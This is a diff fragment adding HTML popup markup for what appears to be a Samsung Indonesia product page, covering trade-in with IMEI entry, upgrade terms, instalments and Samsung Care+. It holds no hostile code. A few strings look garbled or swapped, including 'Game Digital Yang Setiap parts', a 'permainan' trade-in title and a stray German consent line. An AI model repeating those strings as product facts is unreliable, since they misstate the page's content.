+       <!-- CTA 의 동작에 따라 .trade-in-popup__btn-close, .trade-in-popup__btn-back, .trade-in-popup__btn-continue, trade-in-popup__btn-apply 추가 -->
+       <button class="trade-in-popup__btn-close cta cta--outlined cta--black">
+        Tutup
+       </button>
+       <!-- CTA 활성화 시 .cta--disabled 제거 -->
+       <button aria-disabled="true" class="trade-in-popup__btn-continue cta cta--contained cta--emphasis cta--disabled" stepname="zipcode">
+        Lanjutkan
+       </button>
+      </div>
+     </div>
+     <div class="trade-in-popup__imei-wrap" role="dialog">
+      <div class="scrollbar">
+       <div class="trade-in-popup__inner-wrap scrollbar__contents">
+        <p class="trade-in-popup__title">
+         Masukkan IMEI perangkat lama Anda
+        </p>
+        <!-- new-hybris -->
+        <strong class="trade-in-popup__procedure-title">
+         Prosedur tukar tambah permainan
+        </strong>
+        <ul class="trade-in-popup__procedure">
+         <li class="trade-in-popup__procedure-item">
+          <div class="trade-in-popup__procedure-item-img">
+           <div class="image">
+            <img alt="alternative text" class="image__main lazy-load" data-comp-name="image" data-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/test-trade-in-imei-procedure-1.jpg" role="img"/>
+           </div>
+          </div>
+          <p class="trade-in-popup__procedure-item-desc">
+           1. Download App SS.com
+          </p>
+          <div class="trade-in-popup__procedure-link-wrap">
+           <a class="trade-in-popup__procedure-link" href="https://play.google.com/store/apps/details?id=com.stradein.bct.lk6">
+            <div class="image">
+             <img alt="google play link" class="image__main lazy-load" data-comp-name="image" data-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/icon-trade-in-down-google.png" role="img"/>
+            </div>
+           </a>
+           <a class="trade-in-popup__procedure-link" href="https://apps.apple.com/id/app/ss-com-trade-in/id1516570115">
+            <div class="image">
+             <img alt="app store link" class="image__main lazy-load" data-comp-name="image" data-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/icon-trade-in-down-apple.png" role="img"/>
+            </div>
+           </a>
+          </div>
+          <p class="trade-in-popup__procedure-item-desc">
+           atau
+           <br/>
+           Gunakan App
+           <br/>
+           <a aria-label="Open in a new window" href="https://links.s-gift.app/tradein" target="_blank" title="Buka di Tab Baru">
+            Samsung Gift Indonesia
+           </a>
+          </p>
+          <div class="trade-in-popup__procedure-link-wrap">
+           <a class="trade-in-popup__procedure-link" href="https://links.s-gift.app/tradein" target="_blank" title="Buka di Tab Baru">
+            <div class="image">
+             <img alt="samsung gift link" class="image__main lazy-load" data-comp-name="image" data-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/icon-trade-in-down-gift.png" role="img"/>
+            </div>
+           </a>
+          </div>
+         </li>
+         <li class="trade-in-popup__procedure-item">
+          <div class="trade-in-popup__procedure-item-img">
+           <div class="image">
+            <img alt="alternative text" class="image__main lazy-load" data-comp-name="image" data-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/test-trade-in-imei-procedure-2.jpg" role="img"/>
+           </div>
+          </div>
+          <p class="trade-in-popup__procedure-item-desc">
+           2. Lanjutkan proses pada aplikasi untuk mendapatkan harga estimasi  smartphone
+          </p>
+         </li>
+         <li class="trade-in-popup__procedure-item">
+          <div class="trade-in-popup__procedure-item-img">
+           <div class="image">
+            <img alt="alternative text" class="image__main lazy-load" data-comp-name="image" data-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/test-trade-in-imei-procedure-3.jpg" role="img"/>
+           </div>
+          </div>
+          <p class="trade-in-popup__procedure-item-desc">
+           3. Kembali ke laman produk Galaxy yang Anda inginkan dan masukkan kode IMEI
+          </p>
+         </li>
+         <li class="trade-in-popup__procedure-item">
+          <div class="trade-in-popup__procedure-item-img">
+           <div class="image">
+            <img alt="alternative text" class="image__main lazy-load" data-comp-name="image" data-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/test-trade-in-imei-procedure-4.jpg" role="img"/>
+           </div>
+          </div>
+          <p class="trade-in-popup__procedure-item-desc">
+           4. Lanjutkan dengan menyetujui harga perangkat lama Anda
+          </p>
+         </li>
+        </ul>
+        <div class="trade-in-popup__imei">
+         <div class="trade-in-popup__imei-method-wrap">
+          <strong class="trade-in-popup__imei-method-title">
+           Cara menemukan IMEI Anda
+          </strong>
+          <div class="trade-in-popup__imei-method">
+           <div class="trade-in-popup__imei-method-img">
+            <div class="image">
+             <img alt="alternative text" class="image__main lazy-load" data-comp-name="image" data-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/icon-trade-imei.svg" role="img"/>
+            </div>
+           </div>
+           <strong class="trade-in-popup__imei-method-num">
+            <span>
+             *
+            </span>
+            #06#
+           </strong>
+          </div>
+          <ul class="trade-in-popup__imei-method-list">
+           <li class="trade-in-popup__imei-method-list-item">
+            <span>
+             Option 1
+            </span>
+            <span>
+             Tekan * # 06 # untuk menemukan IMEI Anda.
+            </span>
+           </li>
+           <li class="trade-in-popup__imei-method-list-item">
+            <span>
+             Option 2
+            </span>
+            <span>
+             Buka Pengaturan&gt; Umum&gt; Tentang menampilkan IMEI.
+            </span>
+           </li>
+           <!-- new-hybris -->
+          </ul>
+         </div>
+         <div class="trade-in-popup__imei-form-wrap">
+          <strong class="trade-in-popup__imei-form-title">
+           Masukkan nomor IMEI Anda
+          </strong>
+          <div class="trade-in-popup__imei-form">
+           <div class="text-field-v2 no-title">
+            <label class="text-field-v2__hint" for="imei-input">
+             Nomor IMEI (15 digit)
+            </label>
+            <div class="text-field-v2__input-wrap">
+             <input autocomplete="off" class="text-field-v2__input" id="imei-input" maxlength="15" type="text" value=""/>
+             <button class="text-field-v2__input-icon delete" title="Delete">
+              <svg class="icon delete" focusable="false">
+               <use href="#cancel-bold" xlink:href="#cancel-bold">
+               </use>
+              </svg>
+             </button>
+            </div>
+            <p class="text-field-v2__text error">
+             Mohon masukkan IMEI atau Nomor Serial yang valid
+            </p>
+            <p class="text-field-v2__text success">
+             Benar
+            </p>
+           </div>
+          </div>
+         </div>
+        </div>
+        <div class="trade-in-popup__confirm-terms">
+        </div>
+        <div class="trade-in-popup__disclaimer-wrap">
+         <p class="trade-in-popup__disclaimer">
+         </p>
+        </div>
+       </div>
+      </div>
+      <div class="trade-in-popup__btn-wrap">
+       <!-- CTA 의 동작에 따라 .trade-in-popup__btn-close, .trade-in-popup__btn-back, .trade-in-popup__btn-continue, trade-in-popup__btn-apply 추가 -->
+       <button class="trade-in-popup__btn-back cta cta--outlined cta--black" stepname="imei">
+        Kembali
+       </button>
+       <!-- CTA 활성화 시 .cta--disabled 제거 -->
+       <button aria-disabled="true" class="trade-in-popup__btn-continue cta cta--contained cta--emphasis cta--disabled" stepname="imei">
+        Lanjutkan
+       </button>
+      </div>
+     </div>
+     <div class="trade-in-popup__condition-wrap" role="dialog">
+      <div class="scrollbar">
+       <div class="trade-in-popup__inner-wrap scrollbar__contents">
+        <p class="trade-in-popup__title">
+         Last step, Is your phone in good condition?
+        </p>
+        <form id="conditionForm" method="post" name="conditionForm">
+         <ul class="trade-in-popup__condition-list">
+         </ul>
+        </form>
+        <!-- 필요 시 추가 -->
+        <!-- 활성화 시 .trade-in-popup__condition-error--show 추가 -->
+        <p class="trade-in-popup__condition-error">
+         Not eligible for trade-in
+        </p>
+        <!-- new-hybris  -->
+        <div class="trade-in-popup__disclaimer-wrap">
+         <p class="trade-in-popup__disclaimer">
+         </p>
+        </div>
+       </div>
+      </div>
+      <div class="trade-in-popup__btn-wrap">
+       <!-- CTA 의 동작에 따라 .trade-in-popup__btn-close, .trade-in-popup__btn-back, .trade-in-popup__btn-continue, trade-in-popup__btn-apply 추가 -->
+       <button class="trade-in-popup__btn-back cta cta--outlined cta--black" stepname="condition">
+        Kembali
+       </button>
+       <!-- CTA 활성화 시 .cta--disabled 제거 -->
+       <button aria-disabled="true" class="trade-in-popup__btn-continue cta cta--contained cta--emphasis cta--disabled" stepname="condition">
+        Lanjutkan
+       </button>
+      </div>
+     </div>
+     <div class="trade-in-popup__apply-wrap" role="dialog">
+      <div class="scrollbar">
+       <div class="trade-in-popup__inner-wrap scrollbar__contents">
+        <p class="trade-in-popup__title">
+         Harga diskon tukar tambah yang Anda&nbsp;dapatkan
+        </p>
+        <div class="trade-in-popup__summary-wrap">
+         <div class="trade-in-popup__summary">
+          <div class="trade-in-popup__summary-product-wrap">
+           <strong class="trade-in-popup__summary-product-brand">
+           </strong>
+           <strong class="trade-in-popup__summary-product-model">
+           </strong>
+           <span class="trade-in-popup__summary-product-number">
+           </span>
+          </div>
+          <div class="trade-in-popup__summary-price-wrap">
+           <span class="trade-in-popup__summary-price-title cashbacklist">
+            Harga Tukar Tambah
+           </span>
+           <em class="trade-in-popup__summary-price">
+           </em>
+           <span class="trade-in-popup__summary-price-desc">
+           </span>
+          </div>
+         </div>
+         <div class="trade-in-popup__summary-message-wrap">
+          <!-- new-hybris -->
+          <p class="trade-in-popup__summary-message">
+          </p>
+          <p class="trade-in-popup__summary-message--error">
+          </p>
+         </div>
+        </div>
+        <!-- <sly data-sly-test="false">
+				<div class="trade-in-popup__apply-how-to">
+				<strong class="trade-in-popup__apply-how-to-title">How to save money on a new device?</strong>
+					<ul class="trade-in-popup__apply-how-to-list">
+						<li class="trade-in-popup__apply-how-to-item">
+							<span class="trade-in-popup__apply-how-to-item-num">1.</span>
+							<span class="trade-in-popup__apply-how-to-item-text">Untuk smartphone lama Anda, dapatkan diskon untuk smartphone baru di ritel-ritel kami</span>
+						</li>
+						<li class="trade-in-popup__apply-how-to-item">
+							<span class="trade-in-popup__apply-how-to-item-num">2.</span>
+							<span class="trade-in-popup__apply-how-to-item-text">Nilai smartphone lama ditentukan oleh konsultan di lokasi penjualan , tergantung pada kondisi dan model perangkat.</span>
+						</li>
+						<li class="trade-in-popup__apply-how-to-item">
+							<span class="trade-in-popup__apply-how-to-item-num">3.</span>
+							<span class="trade-in-popup__apply-how-to-item-text">Kunjungi toko penjualan yang paling nyaman bagi Anda. Tinggalkan smartphone lama Anda dan beli yang baru.</span>
+						</li>
+					</ul>
+				</div>
+			</sly> -->
+        <div class="trade-in-popup__confirm-terms s-border-top">
+         <strong class="trade-in-popup__confirm-terms-title">
+          Konfirmasi Syarat dan Ketentuan
+         </strong>
+        </div>
+        <div class="trade-in-popup__disclaimer-wrap">
+         <p class="trade-in-popup__disclaimer">
+         </p>
+        </div>
+       </div>
+      </div>
+      <div class="trade-in-popup__btn-wrap">
+       <!-- CTA 의 동작에 따라 .trade-in-popup__btn-close, .trade-in-popup__btn-back, .trade-in-popup__btn-continue, trade-in-popup__btn-apply 추가 -->
+       <button class="trade-in-popup__btn-back cta cta--outlined cta--black" stepname="apply">
+        Kembali
+       </button>
+       <!-- CTA 활성화 시 .cta--disabled 제거 -->
+       <button aria-disabled="true" class="trade-in-popup__btn-apply cta cta--contained cta--emphasis cta--disabled">
+        Yakin
+       </button>
+      </div>
+     </div>
+     <button class="trade-in-popup__close">
+      <span class="hidden">
+       Tutup
+      </span>
+      <svg class="icon" focusable="false">
+       <use href="#delete-bold" xlink:href="#delete-bold">
+       </use>
+      </svg>
+     </button>
+    </div>
+   </section>
+   <div aria-modal="true" class="upgrade-popup" role="dialog">
+    <div class="upgrade-popup__dimmed">
+    </div>
+    <div class="upgrade-popup__content">
+     <div class="scrollbar">
+      <div class="upgrade-popup__content-wrap scrollbar__contents">
+       <div class="upgrade-popup__header">
+        <strong class="upgrade-popup__title">
+         Upgrade Terms and Conditions
+        </strong>
+       </div>
+       <div class="upgrade-popup__body">
+        <div class="upgrade-popup__apply">
+         <div class="upgrade-popup__apply-img">
+          <svg class="icon">
+           <use xlink:href="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/svg-sprite.svg#phone-light">
+           </use>
+          </svg>
+         </div>
+         <div class="upgrade-popup__apply-content">
+         </div>
+        </div>
+        <ul class="upgrade-popup__condition-wrap">
+         <li class="upgrade-popup__condition">
+          <div class="upgrade-popup__condition-img">
+           <div class="image">
+            <img alt="condition image" class="image__main lazy-load" data-comp-name="image" data-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/upgrade-popup-condition-icon-01.png" role="img"/>
+           </div>
+          </div>
+          <p class="upgrade-popup__desc">
+           Hidupkan ponsel dan tahan catu daya
+          </p>
+         </li>
+         <li class="upgrade-popup__condition">
+          <div class="upgrade-popup__condition-img">
+           <div class="image">
+            <img alt="condition image" class="image__main lazy-load" data-comp-name="image" data-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/upgrade-popup-condition-icon-02.png" role="img"/>
+           </div>
+          </div>
+          <p class="upgrade-popup__desc">
+           Keausan normal
+          </p>
+         </li>
+         <li class="upgrade-popup__condition">
+          <div class="upgrade-popup__condition-img">
+           <div class="image">
+            <img alt="condition image" class="image__main lazy-load" data-comp-name="image" data-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/upgrade-popup-condition-icon-03.png" role="img"/>
+           </div>
+          </div>
+          <p class="upgrade-popup__desc">
+           Layar berfungsi &amp; tidak ada layar yang retak
+          </p>
+         </li>
+         <li class="upgrade-popup__condition">
+          <div class="upgrade-popup__condition-img">
+           <div class="image">
+            <img alt="condition image" class="image__main lazy-load" data-comp-name="image" data-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/upgrade-popup-condition-icon-04.png" role="img"/>
+           </div>
+          </div>
+          <p class="upgrade-popup__desc">
+           Not blacklisted
+          </p>
+         </li>
+         <li class="upgrade-popup__condition">
+          <div class="upgrade-popup__condition-img">
+           <div class="image">
+            <img alt="condition image" class="image__main lazy-load" data-comp-name="image" data-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/upgrade-popup-condition-icon-05.png" role="img"/>
+           </div>
+          </div>
+          <p class="upgrade-popup__desc">
+           Factory reset &amp; non-aktifkan penguncian aplikasi
+          </p>
+         </li>
+        </ul>
+        <div class="upgrade-popup__check-info">
+        </div>
+        <div class="upgrade-popup__disclaimer-wrap">
+         <p>
+         </p>
+        </div>
+       </div>
+      </div>
+     </div>
+     <div class="upgrade-popup__footer">
+      <div class="upgrade-popup__cta-wrap">
+       <button an-ac="pd buying tool" an-ca="option click" an-la="upgrade program:close" an-tr="header(pim)_service option selector-product detail-text-button" class="cta cta--outlined cta--black upgrade-popup__cta--close">
+        TUTUP
+       </button>
+       <button an-ac="pd buying tool" an-ca="option click" an-la="upgrade program:confirm" an-tr="header(pim)_service option selector-product detail-text-button" class="cta cta--contained cta--emphasis upgrade-popup__cta--submit">
+        Yakin
+       </button>
+      </div>
+     </div>
+     <button class="upgrade-popup__close">
+      <svg class="icon">
+       <use href="#delete-bold" xlink:href="#delete-bold">
+       </use>
+      </svg>
+      <span class="hidden">
+       Tutup Layar Popup
+      </span>
+     </button>
+    </div>
+   </div>
+   <div aria-modal="true" class="upgrade-learn-more-popup" role="dialog" style="display: none">
+    <div class="upgrade-learn-more-popup__dimmed">
+    </div>
+    <div class="upgrade-learn-more-popup__content">
+     <div class="scrollbar">
+      <div class="upgrade-learn-more-popup__content-wrap scrollbar__contents">
+      </div>
+      <button class="upgrade-learn-more-popup__close">
+       <svg class="icon">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+       <span class="hidden">
+        close popup
+       </span>
+      </button>
+     </div>
+    </div>
+   </div>
+   <div aria-modal="true" class="cancel-return-policy-popup" role="dialog" tabindex="0">
+    <div class="layer-popup">
+     <div class="layer-popup__inner">
+      <div class="layer-popup__contents scrollbar">
+       <div class="scrollbar__contents">
+        <p class="layer-popup__title">
+        </p>
+        <div class="cancel-return-policy-popup__description">
+         <div class="cancel-return-policy-popup__content">
+          <p class="cancel-return-policy-popup__text">
+          </p>
+         </div>
+        </div>
+       </div>
+      </div>
+      <button class="layer-popup__close" type="button">
+       <span class="hidden">
+        Tutup Layar Popup
+       </span>
+       <svg class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </div>
+   <div aria-modal="true" class="warranty-policy-popup" role="dialog" tabindex="0">
+    <div class="layer-popup">
+     <div class="layer-popup__inner">
+      <div class="layer-popup__contents scrollbar">
+       <div class="scrollbar__contents">
+        <p class="layer-popup__title">
+         Jaminan
+        </p>
+        <div class="warranty-policy-popup__description">
+         <div class="warranty-policy-popup__content">
+          <p class="warranty-policy-popup__text">
+          </p>
+         </div>
+        </div>
+       </div>
+      </div>
+      <button class="layer-popup__close" type="button">
+       <span class="hidden">
+        Tutup Layar Popup
+       </span>
+       <svg class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </div>
+   <div class="fold-alert-popup">
+    <div class="layer-popup" id="fold-alert-popup" role="dialog" style="display:block" tabindex="0">
+     <div class="layer-popup__inner">
+      <div class="layer-popup__contents scrollbar">
+       <div class="scrollbar__contents">
+        <div class="layer-popup__title">
+         We recommend to set as below to see optimized screen
+        </div>
+        <div class="fold-alert-popup__wrap">
+         <div class="fold-alert-popup__inner">
+          <ul class="fold-alert-popup__list">
+           <li class="fold-alert-popup__item">
+            <strong class="fold-alert-popup__title">
+             Option 01
+            </strong>
+            <p class="fold-alert-popup__text">
+             Rotate the device until it is horizontal to view the screen in landscape mode.
+            </p>
+           </li>
+           <li class="fold-alert-popup__item">
+            <strong class="fold-alert-popup__title">
+             Option 02
+            </strong>
+            <p class="fold-alert-popup__text">
+             Tab on desktop version in the browser.
+            </p>
+           </li>
+          </ul>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="fold-alert-popup__cta">
+       <!--/* P6의 cta 적용 방식에 따라 마크업 변경 */ -->
+       <a class="cta cta--outlined cta--black" href="<?= $canonical; ?>" title="Tutup">
+        Tutup
+       </a>
+      </div>
+      <button class="layer-popup__close" type="button">
+       <span class="hidden">
+        Tutup Layar Popup
+       </span>
+       <svg class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </div>
+   <div aria-modal="true" class="eip-popup" role="dialog">
+    <div class="layer-popup" id="eip-popup">
+     <div class="layer-popup__inner">
+      <div class="layer-popup__contents scrollbar">
+       <div class="scrollbar__contents">
+        <div class="layer-popup__title">
+         Program CICILAN 0%
+        </div>
+        <div class="eip-popup__wrap">
+         <p class="eip-popup__top-text">
+          <strong>
+           Harga Produk:
+           <span class="eip-popup__top-text--price">
+            Rp 17.099.000
+           </span>
+          </strong>
+         </p>
+         <div class="tab">
+          <ul class="tab__list" role="tablist">
+           <li class="tab__item" role="presentation">
+            <button class="tab__item-title" role="tab">
+             Cicilan Kartu Kredit
+             <span class="tab__item-line">
+             </span>
+            </button>
+           </li>
+          </ul>
+         </div>
+         <div class="eip-popup__tab-wrap">
+          <div class="eip-popup__tab">
+           <div class="eip-popup__tab--dropdown-wrap">
+            <p class="eip-popup__tab--dropdown-title">
+             Pilih Bank
+            </p>
+            <button class="eip-popup__tab--dropdown">
+             BCA
+            </button>
+           </div>
+           <div class="eip-popup__tab--select-wrap scrollbar">
+            <div class="scrollbar__contents">
+             <ul>
+             </ul>
+            </div>
+           </div>
+           <div class="eip-popup__tab--table-wrap scrollbar">
+            <div class="scrollbar__contents">
+            </div>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+      <button class="layer-popup__close" type="button">
+       <span class="hidden">
+        Tutup Layar Popup
+       </span>
+       <svg class="icon" focusable="false">
+        <use href="#cancel-close-regular" xlink:href="#cancel-close-regular">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </div>
+   <div aria-modal="true" class="hubble-careinfo-popup" role="dialog">
+    <div class="layer-popup" id="hubble-careinfo">
+     <div class="layer-popup__inner">
+      <div class="layer-popup__contents scrollbar">
+       <div class="scrollbar__contents">
+        <p class="layer-popup__title">
+         Samsung Care+
+        </p>
+        <div class="hubble-careinfo-popup__body">
+         <div class="hubble-careinfo-popup__info-wrap">
+          <dl class="hubble-careinfo-popup__info">
+          </dl>
+         </div>
+         <div class="hubble-careinfo-popup__explain">
+          <p>
+           Samsung Care+ Disclaimer with link
+          </p>
+         </div>
+        </div>
+       </div>
+      </div>
+      <!-- siteCode == 'za' -->
+      <button class="hubble-care-popup__close">
+       <span class="hidden">
+        Tutup Layar Popup
+       </span>
+       <svg class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </div>
+   <div aria-modal="true" class="sc-learn-more-popup" role="dialog">
+    <div class="layer-popup" id="ScLearnMorePopup">
+     <div class="layer-popup__inner">
+      <div class="layer-popup__contents scrollbar">
+       <div class="scrollbar__contents">
+        <p class="layer-popup__title">
+         Here&rsquo;s what&rsquo;s covered
+        </p>
+        <div class="sc-learn-more-popup__body">
+         <ul class="sc-learn-more-popup__list">
+          <li class="sc-learn-more-popup__item">
+           <div class="sc-learn-more-popup__image">
+            <div class="image">
+             <img alt="alt text" class="image__preview lazy-load responsive-img" data-desktop-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/03-coverage-accidental-damage-repair-pc.png?$198_106_PNG$" data-mobile-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/03-coverage-accidental-damage-repair-mo.png?$260_140_PNG$" role="img"/>
+             <img alt="alt text" class="image__main lazy-load responsive-img" data-desktop-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/03-coverage-accidental-damage-repair-pc.png?$198_106_PNG$" data-mobile-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/03-coverage-accidental-damage-repair-mo.png?$260_140_PNG$" role="img"/>
+            </div>
+           </div>
+           <strong class="sc-learn-more-popup__title">
+            Hardware repairs
+           </strong>
+           <p class="sc-learn-more-popup__text">
+            Get fast, convenient repairs using genuine Game Digital Yang Setiap parts, from our authorized technicians.
+           </p>
+          </li>
+          <li class="sc-learn-more-popup__item">
+           <div class="sc-learn-more-popup__image">
+            <div class="image">
+             <img alt="alt text" class="image__preview lazy-load responsive-img" data-desktop-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/03-coverage-software-malfunction-pc.png?$198_106_PNG$" data-mobile-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/03-coverage-software-malfunction-mo.png?$260_140_PNG$" role="img"/>
+             <img alt="alt text" class="image__main lazy-load responsive-img" data-desktop-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/03-coverage-software-malfunction-pc.png?$198_106_PNG$" data-mobile-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/03-coverage-software-malfunction-mo.png?$260_140_PNG$" role="img"/>
+            </div>
+           </div>
+           <strong class="sc-learn-more-popup__title">
+            Software coverage
+           </strong>
+           <p class="sc-learn-more-popup__text">
+            If your device isn&rsquo;t running smoothly, we&rsquo;ll check and fix the issue.
+           </p>
+          </li>
+          <li class="sc-learn-more-popup__item">
+           <div class="sc-learn-more-popup__image">
+            <div class="image">
+             <img alt="alt text" class="image__preview lazy-load responsive-img" data-desktop-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/03-coverage-battery-replacement-pc.png?$198_106_PNG$" data-mobile-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/03-coverage-battery-replacement-mo.png?$260_140_PNG$" role="img"/>
+             <img alt="alt text" class="image__main lazy-load responsive-img" data-desktop-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/03-coverage-battery-replacement-pc.png?$198_106_PNG$" data-mobile-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/03-coverage-battery-replacement-mo.png?$260_140_PNG$" role="img"/>
+            </div>
+           </div>
+           <strong class="sc-learn-more-popup__title">
+            Battery replacement
+           </strong>
+           <p class="sc-learn-more-popup__text">
+            Stay powered up with hassle-free battery replacements.
+           </p>
+          </li>
+          <li class="sc-learn-more-popup__item">
+           <div class="sc-learn-more-popup__image">
+            <div class="image">
+             <img alt="alt text" class="image__preview lazy-load responsive-img" data-desktop-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/03_coverage_Upto2claims.png?$198_106_PNG$" data-mobile-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/03_coverage_Upto2claims.png$260_140_PNG$" role="img"/>
+             <img alt="alt text" class="image__main lazy-load responsive-img" data-desktop-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/03_coverage_Upto2claims.png?$198_106_PNG$" data-mobile-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/03_coverage_Upto2claims.png$260_140_PNG$" role="img"/>
+            </div>
+           </div>
+           <strong class="sc-learn-more-popup__title">
+            4 claims within
+           </strong>
+           <p class="sc-learn-more-popup__text">
+            Make up to 4 claims for repair  or replacement  within 2 years,  and save with a low deductible  per claim.
+           </p>
+          </li>
+         </ul>
+         <div class="sc-learn-more-popup__cta">
+          <a aria-label="Link Title" class="cta cta--underline cta--black cta--icon" href="https://www.samsung.com/id/offer/samsung-care-plus/" target="_blank">
+           See all benefits
+           <svg aria-hidden="true" class="icon" focusable="false">
+            <use href="#outlink-bold" xlink:href="#outlink-bold">
+            </use>
+           </svg>
+          </a>
+         </div>
+         <div class="sc-learn-more-popup__disclaimer">
+         </div>
+        </div>
+       </div>
+      </div>
+      <button class="sc-learn-more-popup__close">
+       <span class="hidden">
+        Close popup
+       </span>
+       <svg aria-hidden="true" class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </div>
+   <div aria-modal="true" class="hubble-care-popup smcpopup" role="dialog">
+    <div class="layer-popup" id="hubble-care">
+     <div class="layer-popup__inner">
+      <div class="layer-popup__contents scrollbar">
+       <div class="scrollbar__contents">
+        <p class="layer-popup__title layer-popup__title--no-icon">
+         Samsung Care+
+        </p>
+        <p class="layer-popup__desc">
+         <!-- CRHQ-3719 -->
+         Layanan Perbaikan Secara Total untuk Smartphone Galaxy Anda. Hindari Kejadian Tidak Terduga Dengan Perlindungan Ekstra
+        </p>
+        <div class="hubble-care-popup__body">
+         <div class="hubble-care-popup__smc">
+          <div class="hubble-care-popup__smc-inner">
+          </div>
+          <p class="hubble-care-popup__smc-message" style="display: none">
+          </p>
+         </div>
+         <div class="hubble-care-popup__image">
+          <div class="image">
+           <img alt="Accidental damage, Worldwide cover, Repairs by genuine parts" class="image__preview lazy-load responsive-img" data-desktop-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/@care-image-new.jpg" data-mobile-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/@care-image.jpg"/>
+           <img alt="Accidental damage, Worldwide cover, Repairs by genuine parts" class="image__main lazy-load responsive-img" data-desktop-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/@care-image-new.jpg" data-mobile-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/@care-image.jpg"/>
+          </div>
+         </div>
+         <div class="hubble-care-popup__check">
+          <div class="hubble-care-popup__check-title">
+           Syarat dan Ketentuan Samsung Protection
+          </div>
+          <ul class="hubble-care-popup__check-list-wrap">
+          </ul>
+          <p aria-hidden="true" class="hubble-care-popup__check-error">
+           *Anda harus menyetujui terlebih dahulu
+          </p>
+         </div>
+
+        </div>
+       </div>
+      </div>
+      <div class="hubble-care-popup__foot">
+       <div class="hubble-care-popup__button">
+        <div class="hubble-care-popup__button-inner">
+         <div class="hubble-care-popup__button-item">
+          <a an-ac="pd buying tool" an-ca="option click" an-la="samsung care:close" an-tr="header(pim)_service option selector:samsung care-product detail-close-option_click1" class="cta cta--outlined cta--black" href="javascript:void(0)" role="button">
+           Tutup
+          </a>
+         </div>
+         <div class="hubble-care-popup__button-item">
+          <a an-ac="pd buying tool" an-ca="option click" an-la="samsung care:confirm" an-tr="header(pim)_service option selector:samsung care-product detail-confirm-option_click1" aria-disabled="true" class="cta cta--contained cta--emphasis cta--disabled" href="javascript:void(0)" role="button">
+           Yakin
+          </a>
+         </div>
+        </div>
+       </div>
+      </div>
+      <button class="hubble-care-popup__close">
+       <span class="hidden">
+        Tutup Layar Popup
+       </span>
+       <svg class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </div>
+   <div aria-modal="true" class="hubble-care-popup__alert" role="dialog" tabindex="0">
+    <div class="layer-popup" id="hubble-care-alert1">
+     <div class="layer-popup__inner">
+      <div class="layer-popup__contents">
+       Ich habe die Allgemeinen Versicherungsbedingungen heruntergeladen, gelesen und erkl&auml;re mich mit diesen einverstanden.
+       <div class="hubble-care-popup__alert-button">
+        <a class="cta cta--contained cta--emphasis" href="<?= $canonical; ?>" title="Best&auml;tigen">
+         Best&auml;tigen
+        </a>
+       </div>
+      </div>
+      <button class="hubble-care-popup__alert-close">
+       <span class="hidden">
+        Tutup Layar Popup
+       </span>
+       <svg class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </div>
+   <div aria-modal="true" class="hubble-care-popup__alert" role="dialog" tabindex="0">
+    <div class="layer-popup" id="hubble-care-alert2">
+     <div class="layer-popup__inner">
